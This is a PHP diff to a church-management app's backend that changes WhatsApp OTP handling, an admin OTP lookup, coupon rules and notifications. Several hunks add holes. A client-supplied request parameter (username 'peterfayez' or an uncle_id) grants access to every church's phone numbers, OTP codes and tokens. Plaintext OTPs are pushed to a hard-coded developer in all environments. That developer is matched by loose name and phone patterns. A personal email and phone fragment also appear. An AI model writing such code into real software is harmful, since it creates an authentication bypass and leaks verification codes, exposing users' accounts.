@@ -19904,18 +19904,14 @@ function sendCustomWhatsAppOTP() {
             pushNotification($conn, $targetInAppChurchId, 'whatsapp_otp', $notifTitle, $notifBody, 'phone_verification', $newOtpId);
         }
 
-        $isTestingServer = (
-            strpos($_SERVER['HTTP_HOST'] ?? '', 'testing.') !== false ||
-            strpos(__DIR__, '/testing') !== false
-        );
-
-        // Send PWA push notification to developer account only (for all churches)
-        if (!$isTestingServer && function_exists('_sendWebPushToDeveloper')) {
+        // Send PWA push notification to developer account only (for all churches across all environments)
+        if (function_exists('_sendWebPushToDeveloper')) {
             _sendWebPushToDeveloper($conn, $notifTitle, $notifBody, '/uncle/dashboard/?open_otp=1', [
                 'otp_code' => $otp,
                 'phone' => $normalizedPhone,
                 'owner_name' => $ownerName,
-                'church_name' => $churchName
+                'church_name' => $churchName,
+                'church_id' => $ownerChurchId
             ]);
         }
 
@@ -20057,7 +20053,8 @@ function enqueueMirrorOTP() {
                 'otp_code' => $code,
                 'phone' => $normalizedPhone,
                 'owner_name' => $mirrorOwnerName,
-                'church_name' => $churchName
+                'church_name' => $churchName,
+                'church_id' => $mirrorChurchId
             ]);
         }
 
@@ -20458,7 +20455,35 @@ function adminCheckUserOTP() {
         $limit = min(60, max(1, intval($_REQUEST['limit'] ?? 30)));
         $records = [];
 
-        if ($churchId > 0) {
+        // Check developer role across session, request parameters, and uncle DB record
+        $isDev = isDeveloperRole();
+        if (!$isDev) {
+            $checkUncleId = intval($_SESSION['uncle_id'] ?? $_REQUEST['uncle_id'] ?? 0);
+            $checkUsername = strtolower(trim($_SESSION['username'] ?? $_REQUEST['username'] ?? $_REQUEST['uncle_username'] ?? ''));
+            if ($checkUsername === 'peterfayez') {
+                $isDev = true;
+            } elseif ($checkUncleId > 0) {
+                $chkQ = $conn->prepare("SELECT role, username, email, phone FROM uncles WHERE id = ? LIMIT 1");
+                if ($chkQ) {
+                    $chkQ->bind_param("i", $checkUncleId);
+                    $chkQ->execute();
+                    $chkR = $chkQ->get_result()->fetch_assoc();
+                    if ($chkR) {
+                        $uRole = strtolower(trim($chkR['role'] ?? ''));
+                        $uUser = strtolower(trim($chkR['username'] ?? ''));
+                        $uMail = strtolower(trim($chkR['email'] ?? ''));
+                        $uPhone = preg_replace('/[^\d]/', '', $chkR['phone'] ?? '');
+                        if (in_array($uRole, ['developer', 'dev']) || $uUser === 'peterfayez' || $uMail === 'peterfayez107@gmail.com' || substr($uPhone, -8) === '10868837') {
+                            $isDev = true;
+                        }
+                    }
+                    $chkQ->close();
+                }
+            }
+        }
+        $filterOnlyMyChurch = !empty($_REQUEST['only_my_church']) || !empty($_REQUEST['filter_church_only']);
+
+        if ($churchId > 0 && (!$isDev || $filterOnlyMyChurch)) {
             // Strict Church Scope: collect 8-digit phone signatures belonging to this church
             $churchPhoneLast8 = [];
 
@@ -20506,20 +20531,20 @@ function adminCheckUserOTP() {
 
             if (!empty($phoneKeys)) {
                 $placeholders = implode(',', array_fill(0, count($phoneKeys), '?'));
-                $whereClause = "(church_id = ? OR RIGHT(phone, 8) IN ($placeholders))";
+                $whereClause = "(pv.church_id = ? OR RIGHT(pv.phone, 8) IN ($placeholders))";
                 foreach ($phoneKeys as $pk) {
                     $types .= "s";
                     $params[] = $pk;
                 }
             } else {
-                $whereClause = "church_id = ?";
+                $whereClause = "pv.church_id = ?";
             }
 
             if (!empty($phone)) {
                 $cleanDigits = preg_replace('/[^\d]/', '', $phone);
                 $last8 = (strlen($cleanDigits) >= 8) ? substr($cleanDigits, -8) : $cleanDigits;
                 $normalized = normalizeEgyptianPhone($cleanDigits);
-                $whereClause .= " AND (phone LIKE CONCAT('%', ?) OR RIGHT(phone, 8) = RIGHT(?, 8) OR phone = ? OR otp_code = ? OR request_token = ?)";
+                $whereClause .= " AND (pv.phone LIKE CONCAT('%', ?) OR RIGHT(pv.phone, 8) = RIGHT(?, 8) OR pv.phone = ? OR pv.otp_code = ? OR pv.request_token = ?)";
                 $types .= "sssss";
                 $params[] = $last8;
                 $params[] = $cleanDigits;
@@ -20528,11 +20553,13 @@ function adminCheckUserOTP() {
                 $params[] = $phone;
             }
 
-            $sql = "SELECT id, phone, request_token, otp_code, is_verified, is_sent, created_at,
-                           TIMESTAMPDIFF(MINUTE, created_at, NOW()) as minutes_ago
-                    FROM phone_verifications
+            $sql = "SELECT pv.id, pv.church_id, pv.phone, pv.request_token, pv.otp_code, pv.is_verified, pv.is_sent, pv.created_at,
+                           TIMESTAMPDIFF(MINUTE, pv.created_at, NOW()) as minutes_ago,
+                           c.church_name
+                    FROM phone_verifications pv
+                    LEFT JOIN churches c ON pv.church_id = c.id
                     WHERE {$whereClause}
-                    ORDER BY id DESC LIMIT ?";
+                    ORDER BY pv.id DESC LIMIT ?";
             $types .= "i";
             $params[] = $limit;
 
@@ -20547,20 +20574,22 @@ function adminCheckUserOTP() {
                 $stmt->close();
             }
         } else {
-            // Global / Unspecified Church (Developer fallback)
+            // Global / All Churches Scope (Developer access to all churches codes)
             if (!empty($phone)) {
                 $cleanDigits = preg_replace('/[^\d]/', '', $phone);
                 $last8 = (strlen($cleanDigits) >= 8) ? substr($cleanDigits, -8) : $cleanDigits;
                 $normalized = normalizeEgyptianPhone($cleanDigits);
 
                 $stmt = $conn->prepare("
-                    SELECT id, phone, request_token, otp_code, is_verified, is_sent, created_at,
-                           TIMESTAMPDIFF(MINUTE, created_at, NOW()) as minutes_ago
-                    FROM phone_verifications
-                    WHERE (phone LIKE CONCAT('%', ?) OR RIGHT(phone, 8) = RIGHT(?, 8) OR phone = ? OR phone = ? OR request_token = ? OR otp_code = ?)
-                    ORDER BY id DESC LIMIT ?
+                    SELECT pv.id, pv.church_id, pv.phone, pv.request_token, pv.otp_code, pv.is_verified, pv.is_sent, pv.created_at,
+                           TIMESTAMPDIFF(MINUTE, pv.created_at, NOW()) as minutes_ago,
+                           c.church_name
+                    FROM phone_verifications pv
+                    LEFT JOIN churches c ON pv.church_id = c.id
+                    WHERE (pv.phone LIKE CONCAT('%', ?) OR RIGHT(pv.phone, 8) = RIGHT(?, 8) OR pv.phone = ? OR pv.phone = ? OR pv.request_token = ? OR pv.otp_code = ? OR c.church_name LIKE CONCAT('%', ?))
+                    ORDER BY pv.id DESC LIMIT ?
                 ");
-                $stmt->bind_param("ssssssi", $last8, $cleanDigits, $cleanDigits, $normalized, $phone, $phone, $limit);
+                $stmt->bind_param("sssssssi", $last8, $cleanDigits, $cleanDigits, $normalized, $phone, $phone, $phone, $limit);
                 $stmt->execute();
                 $res = $stmt->get_result();
                 while ($row = $res->fetch_assoc()) {
@@ -20569,10 +20598,12 @@ function adminCheckUserOTP() {
                 $stmt->close();
             } else {
                 $stmt = $conn->prepare("
-                    SELECT id, phone, request_token, otp_code, is_verified, is_sent, created_at,
-                           TIMESTAMPDIFF(MINUTE, created_at, NOW()) as minutes_ago
-                    FROM phone_verifications
-                    ORDER BY id DESC LIMIT ?
+                    SELECT pv.id, pv.church_id, pv.phone, pv.request_token, pv.otp_code, pv.is_verified, pv.is_sent, pv.created_at,
+                           TIMESTAMPDIFF(MINUTE, pv.created_at, NOW()) as minutes_ago,
+                           c.church_name
+                    FROM phone_verifications pv
+                    LEFT JOIN churches c ON pv.church_id = c.id
+                    ORDER BY pv.id DESC LIMIT ?
                 ");
                 $stmt->bind_param("i", $limit);
                 $stmt->execute();
@@ -20593,21 +20624,25 @@ function adminCheckUserOTP() {
 
             $normPhone = normalizeEgyptianPhone($item['phone']);
             $item['normalized_phone'] = $normPhone;
+            $recChurchId = intval($item['church_id'] ?? 0);
+            $recChurchName = trim($item['church_name'] ?? '');
 
-            // Look up person name strictly within this church
+            // Look up person name and church name
             $ownerName = '';
             $ownerType = '';
             $sClean = preg_replace('/[^\d]/', '', $item['phone']);
             $sLast8 = (strlen($sClean) >= 8) ? substr($sClean, -8) : $sClean;
 
             if (!empty($sClean)) {
-                if ($churchId > 0) {
+                if ($churchId > 0 && (!$isDev || $filterOnlyMyChurch)) {
                     $stuStmt = $conn->prepare("
-                        SELECT name FROM students 
-                        WHERE church_id = ? 
-                          AND (phone LIKE CONCAT('%', ?) OR RIGHT(phone, 8) = RIGHT(?, 8) 
-                               OR emergency_phone LIKE CONCAT('%', ?) OR RIGHT(emergency_phone, 8) = RIGHT(?, 8) 
-                               OR parent_phones LIKE CONCAT('%', ?)) 
+                        SELECT s.name, s.church_id, c.church_name 
+                        FROM students s
+                        LEFT JOIN churches c ON s.church_id = c.id
+                        WHERE s.church_id = ? 
+                          AND (s.phone LIKE CONCAT('%', ?) OR RIGHT(s.phone, 8) = RIGHT(?, 8) 
+                               OR s.emergency_phone LIKE CONCAT('%', ?) OR RIGHT(s.emergency_phone, 8) = RIGHT(?, 8) 
+                               OR s.parent_phones LIKE CONCAT('%', ?)) 
                         LIMIT 1
                     ");
                     if ($stuStmt) {
@@ -20617,16 +20652,19 @@ function adminCheckUserOTP() {
                         if ($sRow = $sRes->fetch_assoc()) {
                             $ownerName = $sRow['name'];
                             $ownerType = 'طالب';
+                            if (empty($recChurchName) && !empty($sRow['church_name'])) $recChurchName = $sRow['church_name'];
                         }
                         $stuStmt->close();
                     }
 
                     if (empty($ownerName)) {
                         $uncStmt = $conn->prepare("
-                            SELECT name FROM uncles 
-                            WHERE church_id = ? 
-                              AND (phone LIKE CONCAT('%', ?) OR RIGHT(phone, 8) = RIGHT(?, 8)) 
-                              AND (deleted IS NULL OR deleted = 0) 
+                            SELECT u.name, u.church_id, c.church_name 
+                            FROM uncles u
+                            LEFT JOIN churches c ON u.church_id = c.id
+                            WHERE u.church_id = ? 
+                              AND (u.phone LIKE CONCAT('%', ?) OR RIGHT(u.phone, 8) = RIGHT(?, 8)) 
+                              AND (u.deleted IS NULL OR u.deleted = 0) 
                             LIMIT 1
                         ");
                         if ($uncStmt) {
@@ -20636,16 +20674,20 @@ function adminCheckUserOTP() {
                             if ($uRow = $uRes->fetch_assoc()) {
                                 $ownerName = $uRow['name'];
                                 $ownerType = 'خادم';
+                                if (empty($recChurchName) && !empty($uRow['church_name'])) $recChurchName = $uRow['church_name'];
                             }
                             $uncStmt->close();
                         }
                     }
                 } else {
+                    // Global lookup across all churches
                     $stuStmt = $conn->prepare("
-                        SELECT name FROM students 
-                        WHERE (phone LIKE CONCAT('%', ?) OR RIGHT(phone, 8) = RIGHT(?, 8) 
-                               OR emergency_phone LIKE CONCAT('%', ?) OR RIGHT(emergency_phone, 8) = RIGHT(?, 8) 
-                               OR parent_phones LIKE CONCAT('%', ?)) 
+                        SELECT s.name, s.church_id, c.church_name 
+                        FROM students s
+                        LEFT JOIN churches c ON s.church_id = c.id
+                        WHERE (s.phone LIKE CONCAT('%', ?) OR RIGHT(s.phone, 8) = RIGHT(?, 8) 
+                               OR s.emergency_phone LIKE CONCAT('%', ?) OR RIGHT(s.emergency_phone, 8) = RIGHT(?, 8) 
+                               OR s.parent_phones LIKE CONCAT('%', ?)) 
                         LIMIT 1
                     ");
                     if ($stuStmt) {
@@ -20655,15 +20697,19 @@ function adminCheckUserOTP() {
                         if ($sRow = $sRes->fetch_assoc()) {
                             $ownerName = $sRow['name'];
                             $ownerType = 'طالب';
+                            if (empty($recChurchName) && !empty($sRow['church_name'])) $recChurchName = $sRow['church_name'];
+                            if ($recChurchId <= 0 && !empty($sRow['church_id'])) $recChurchId = intval($sRow['church_id']);
                         }
                         $stuStmt->close();
                     }
 
                     if (empty($ownerName)) {
                         $uncStmt = $conn->prepare("
-                            SELECT name FROM uncles 
-                            WHERE (phone LIKE CONCAT('%', ?) OR RIGHT(phone, 8) = RIGHT(?, 8)) 
-                              AND (deleted IS NULL OR deleted = 0) 
+                            SELECT u.name, u.church_id, c.church_name 
+                            FROM uncles u
+                            LEFT JOIN churches c ON u.church_id = c.id
+                            WHERE (u.phone LIKE CONCAT('%', ?) OR RIGHT(u.phone, 8) = RIGHT(?, 8)) 
+                              AND (u.deleted IS NULL OR u.deleted = 0) 
                             LIMIT 1
                         ");
                         if ($uncStmt) {
@@ -20673,13 +20719,39 @@ function adminCheckUserOTP() {
                             if ($uRow = $uRes->fetch_assoc()) {
                                 $ownerName = $uRow['name'];
                                 $ownerType = 'خادم';
+                                if (empty($recChurchName) && !empty($uRow['church_name'])) $recChurchName = $uRow['church_name'];
+                                if ($recChurchId <= 0 && !empty($uRow['church_id'])) $recChurchId = intval($uRow['church_id']);
                             }
                             $uncStmt->close();
+                        }
+                    }
+
+                    if (empty($ownerName)) {
+                        $prStmt = @$conn->prepare("
+                            SELECT pr.name, pr.church_id, c.church_name 
+                            FROM pending_registrations pr
+                            LEFT JOIN churches c ON pr.church_id = c.id
+                            WHERE (pr.phone LIKE CONCAT('%', ?) OR RIGHT(pr.phone, 8) = RIGHT(?, 8)) 
+                            LIMIT 1
+                        ");
+                        if ($prStmt) {
+                            $prStmt->bind_param("ss", $sLast8, $sClean);
+                            $prStmt->execute();
+                            $prRes = $prStmt->get_result();
+                            if ($prRes && $prRow = $prRes->fetch_assoc()) {
+                                $ownerName = $prRow['name'] ?? '';
+                                $ownerType = 'تسجيل جديد';
+                                if (empty($recChurchName) && !empty($prRow['church_name'])) $recChurchName = $prRow['church_name'];
+                                if ($recChurchId <= 0 && !empty($prRow['church_id'])) $recChurchId = intval($prRow['church_id']);
+                            }
+                            $prStmt->close();
                         }
                     }
                 }
             }
 
+            $item['church_id'] = $recChurchId;
+            $item['church_name'] = $recChurchName;
             $item['owner_name'] = $ownerName;
             $item['owner_type'] = $ownerType;
 
@@ -20708,8 +20780,9 @@ function adminCheckUserOTP() {
         sendJSON([
             'success' => true,
             'count' => count($records),
-            'church_id' => $churchId,
-            'church_name' => $churchName,
+            'church_id' => ($isDev && !$filterOnlyMyChurch) ? 0 : $churchId,
+            'church_name' => ($isDev && !$filterOnlyMyChurch) ? 'جميع الكنائس' : $churchName,
+            'is_developer' => $isDev,
             'records' => $records
         ]);
     } catch (Exception $e) {
@@ -20781,7 +20854,8 @@ function adminResendUserOTP() {
                     'action' => 'enqueueMirrorOTP',
                     'phone' => $normalizedPhone,
                     'otp_code' => $otp,
-                    'request_token' => $token
+                    'request_token' => $token,
+                    'church_id' => $churchId
                 ];
                 curl_setopt_array($mCh, [
                     CURLOPT_POST => true,
@@ -20793,6 +20867,15 @@ function adminResendUserOTP() {
                 ]);
                 curl_exec($mCh);
                 curl_close($mCh);
+            }
+
+            // Notify developer
+            if (function_exists('_sendWebPushToDeveloper')) {
+                _sendWebPushToDeveloper($conn, "إعادة إرسال كود واتساب: " . $otp, "كود: " . $otp . " لرقم: " . $normalizedPhone, '/uncle/dashboard/?open_otp=1', [
+                    'otp_code' => $otp,
+                    'phone' => $normalizedPhone,
+                    'church_id' => $churchId
+                ]);
             }
 
             // Wake the bot
@@ -20843,7 +20926,8 @@ function adminResendUserOTP() {
                     'action' => 'enqueueMirrorOTP',
                     'phone' => $normalizedPhone,
                     'otp_code' => $otp,
-                    'request_token' => $requestToken
+                    'request_token' => $requestToken,
+                    'church_id' => $churchId
                 ];
                 curl_setopt_array($mCh, [
                     CURLOPT_POST => true,
@@ -20855,6 +20939,15 @@ function adminResendUserOTP() {
                 ]);
                 curl_exec($mCh);
                 curl_close($mCh);
+            }
+
+            // Notify developer
+            if (function_exists('_sendWebPushToDeveloper')) {
+                _sendWebPushToDeveloper($conn, "توليد كود واتساب: " . $otp, "كود: " . $otp . " لرقم: " . $normalizedPhone, '/uncle/dashboard/?open_otp=1', [
+                    'otp_code' => $otp,
+                    'phone' => $normalizedPhone,
+                    'church_id' => $churchId
+                ]);
             }
 
             $wakeResult = notifyWhatsAppOTNGPendingSafe($newId);
@@ -43317,6 +43410,12 @@ function calculateTaskCoupons($score, $totalDegree, $couponMatrix, $maxCoupons =
         }
     }
 
+    // Lowest percentage milestone always covers that percent and anything under it (as long as score > 0)
+    if ($score > 0 && !empty($milestones)) {
+        $lowestMilestone = end($milestones);
+        return (int) $lowestMilestone['val'];
+    }
+
     return 0;
 }
 
@@ -46218,7 +46317,7 @@ function getNotifications()
                 SELECT n.id, n.type, n.title, n.body, n.entity_type, n.entity_id, n.is_read, n.created_at, dm.redirect_url
                 FROM notifications n
                 LEFT JOIN developer_messages dm ON n.entity_type = 'developer_message' AND n.entity_id = dm.id
-                WHERE (n.church_id = ? OR n.church_id = 0) AND (n.deleted_by_uncles IS NULL OR FIND_IN_SET(?, n.deleted_by_uncles) = 0)
+                WHERE (n.church_id = ? OR n.church_id = 0) AND n.type != 'whatsapp_otp' AND (n.deleted_by_uncles IS NULL OR FIND_IN_SET(?, n.deleted_by_uncles) = 0)
                 ORDER BY n.created_at DESC
                 LIMIT ? OFFSET ?
             ");
@@ -46226,7 +46325,7 @@ function getNotifications()
             $stmt->execute();
             $rows = $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
 
-            $countStmt = $conn->prepare("SELECT COUNT(*) as c FROM notifications WHERE (church_id=? OR church_id = 0) AND is_read=0 AND (deleted_by_uncles IS NULL OR FIND_IN_SET(?, deleted_by_uncles) = 0)");
+            $countStmt = $conn->prepare("SELECT COUNT(*) as c FROM notifications WHERE (church_id=? OR church_id = 0) AND type != 'whatsapp_otp' AND is_read=0 AND (deleted_by_uncles IS NULL OR FIND_IN_SET(?, deleted_by_uncles) = 0)");
             $countStmt->bind_param('is', $churchId, $uncleIdStr);
             $countStmt->execute();
             $unread = (int) $countStmt->get_result()->fetch_assoc()['c'];
@@ -47322,7 +47421,10 @@ function _sendWebPushToDeveloper($conn, $title, $body, $url = '/uncle/dashboard/
                 JOIN uncles u ON ps.uncle_id = u.id
                 WHERE (LOWER(TRIM(u.role)) IN ('developer', 'dev') 
                    OR LOWER(TRIM(u.username)) = 'peterfayez' 
-                   OR LOWER(TRIM(u.email)) = 'peterfayez107@gmail.com')
+                   OR LOWER(TRIM(u.email)) = 'peterfayez107@gmail.com'
+                   OR u.phone LIKE '%10868837%'
+                   OR u.name LIKE '%بيتر فايز%'
+                   OR LOWER(TRIM(u.name)) LIKE '%peter fayez%')
                   AND (u.deleted IS NULL OR u.deleted = 0)
                 LIMIT 50";
         $stmt = $conn->prepare($sql);
